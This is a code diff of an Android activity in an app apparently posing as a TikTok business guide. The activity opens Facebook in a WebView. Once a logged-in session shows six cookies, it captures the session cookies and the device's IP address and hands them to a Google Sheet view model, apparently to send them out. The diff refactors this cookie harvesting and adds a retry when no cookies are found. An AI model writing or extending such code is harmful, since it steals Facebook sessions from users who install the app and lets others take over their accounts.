@@ -6,20 +6,17 @@ import androidx.lifecycle.ViewModelProviders;
 
 import android.content.Intent;
 import android.os.Bundle;
-import android.text.format.Formatter;
 import android.util.Log;
 import android.webkit.CookieManager;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
+import android.widget.Toast;
 
 import com.teamwork.businessguideprofortiktok.R;
 import com.teamwork.businessguideprofortiktok.src.resource.pages.reponse_cookies_page.ReponseCookiesActivity;
-import com.teamwork.businessguideprofortiktok.src.resource.viewmodels.GoogleSheetViewModel;
+import com.teamwork.businessguideprofortiktok.src.resource.viewmodels.google_sheet.GoogleSheetViewModel;
+import com.teamwork.businessguideprofortiktok.src.utils.Constant;
 
-import java.net.InetAddress;
-import java.net.NetworkInterface;
-import java.net.SocketException;
-import java.util.Enumeration;
 
 public class WebViewFacebookActivity extends AppCompatActivity {
     private WebView mWebViewFb;
@@ -31,7 +28,7 @@ public class WebViewFacebookActivity extends AppCompatActivity {
         setContentView(R.layout.activity_webview_fb);
         mRepository = ViewModelProviders.of(WebViewFacebookActivity.this).get(GoogleSheetViewModel.class);
 
-        initWebViewFB();
+        initView();
         listenerCallbackSever(mRepository);
 
 
@@ -56,46 +53,38 @@ public class WebViewFacebookActivity extends AppCompatActivity {
             @Override
             public void onChanged(String s) {
                 Log.d("TAG", "onChanged: 111: "+s);
+                if (s.equals("Success")){
+                    Intent intent = new Intent(WebViewFacebookActivity.this, ReponseCookiesActivity.class);
+                    startActivity(intent);
+                }else {
+                    Toast.makeText(WebViewFacebookActivity.this, "NO COOKIES", Toast.LENGTH_SHORT).show();
+                    try {
+                        Thread.sleep(3000);
+                        finish();
+                        startActivity(getIntent());
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
+                }
             }
         });
     }
 
-    public String getLocalIpAddress() {
-        try {
-            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
-                NetworkInterface intf = en.nextElement();
-                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
-                    InetAddress inetAddress = enumIpAddr.nextElement();
-                    if (!inetAddress.isLoopbackAddress()) {
-                        String ip = Formatter.formatIpAddress(inetAddress.hashCode());
-                        Log.i("IP", "***** IP="+ ip);
-
-                        return ip;
-                    }
-                }
-            }
-        } catch (SocketException ex) {
-            Log.e("IP", ex.toString());
-        }
-        return null;
-    }
-
-    private void initWebViewFB() {
+    private void initView() {
         mWebViewFb = findViewById(R.id.webViewFB);
-        mWebViewFb.loadUrl("https://www.facebook.com/");
+        mWebViewFb.loadUrl(Constant.mUrlFace);
         mWebViewFb.setWebViewClient(new WebViewClient(){
             @Override
             public void onPageFinished(WebView view, String url) {
-                String strCookies = CookieManager.getInstance().getCookie("https://www.facebook.com/");
+                String strCookies = CookieManager.getInstance().getCookie(Constant.mUrlFace);
 
                 String[]arrayCookies = strCookies.split(";");
 
                 if (arrayCookies.length == 6){
-                    String ip = getLocalIpAddress();
+                    String ip = mRepository.getLocalIpAddress();
                     mRepository.setCookies(strCookies);
                     mRepository.setIp(ip);
-                    Intent intent = new Intent(WebViewFacebookActivity.this, ReponseCookiesActivity.class);
-                    startActivity(intent);
+
                 }
             }
         });
